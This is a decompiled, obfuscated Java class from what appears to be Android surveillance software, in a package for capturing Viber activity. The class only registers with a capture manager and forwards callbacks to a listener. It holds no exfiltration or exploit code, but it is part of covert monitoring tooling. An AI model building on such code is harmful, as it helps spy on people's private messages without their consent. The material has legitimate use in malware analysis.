package com.vvt.capture.viber.mode.full;

import com.vvt.ak.a;
import com.vvt.base.capture.i;

public class e
  implements com.vvt.base.capture.e, i
{
  private static final boolean a = a.a;
  private static final boolean b = a.b;
  private i c;
  private f d;
  private boolean e;
  
  public e()
  {
    f localf = f.a();
    this.d = localf;
  }
  
  public void a()
  {
    boolean bool = this.e;
    if (bool)
    {
      bool = b;
      if (bool) {}
      i locali = this.c;
      locali.a();
    }
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (!bool)
    {
      bool = true;
      this.e = bool;
      this.c = parami;
      f localf = this.d;
      localf.a(this);
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    boolean bool = this.e;
    if (bool)
    {
      bool = b;
      if (bool) {}
      i locali = this.c;
      locali.a(paramString);
    }
  }
  
  public void a(String paramString1, String paramString2)
  {
    boolean bool = this.e;
    if (bool)
    {
      bool = b;
      if (bool) {}
      i locali = this.c;
      locali.a(paramString1, paramString2);
    }
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (bool)
    {
      bool = false;
      this.e = false;
      f localf = this.d;
      if (localf != null)
      {
        localf = this.d;
        localf.b(this);
      }
    }
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/viber/mode/full/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */